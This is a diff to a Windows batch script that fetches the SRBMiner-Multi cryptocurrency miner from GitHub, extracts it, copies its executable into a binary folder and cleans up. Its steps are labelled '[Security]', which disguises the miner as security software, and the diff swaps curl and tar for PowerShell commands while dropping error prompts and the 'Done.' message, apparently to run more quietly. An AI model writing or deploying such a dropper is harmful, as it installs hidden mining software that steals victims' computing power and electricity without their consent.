@@ -25,25 +25,10 @@ REM =========================
 if exist "%FLAG%" goto SKIP_DOWNLOAD
 
 echo [Security] Downloading binary...
-
-curl -L --retry 5 --retry-delay 3 --fail ^
-  -o "%ZIP%" ^
-  https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip
-
-if not exist "%ZIP%" (
-    echo [ERROR] Download failed
-    pause
-    exit /b 1
-)
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip' -OutFile '%ZIP%' -UseBasicParsing"
 
 echo [Security] Extracting...
-tar -xf "%ZIP%" -C "%BASE%"
-
-if not exist "%EXTRACT%\SRBMiner-MULTI.exe" (
-    echo [ERROR] Extraction failed
-    pause
-    exit /b 1
-)
+powershell -Command "Expand-Archive -Force '%ZIP%' '%BASE%'"
 
 copy /y "%EXTRACT%\SRBMiner-MULTI.exe" "%BIN%" >nul
 
@@ -51,7 +36,6 @@ del /f /q "%ZIP%"
 rmdir /s /q "%EXTRACT%"
 
 echo OK>"%FLAG%"
-echo Done.
 
 :SKIP_DOWNLOAD
 
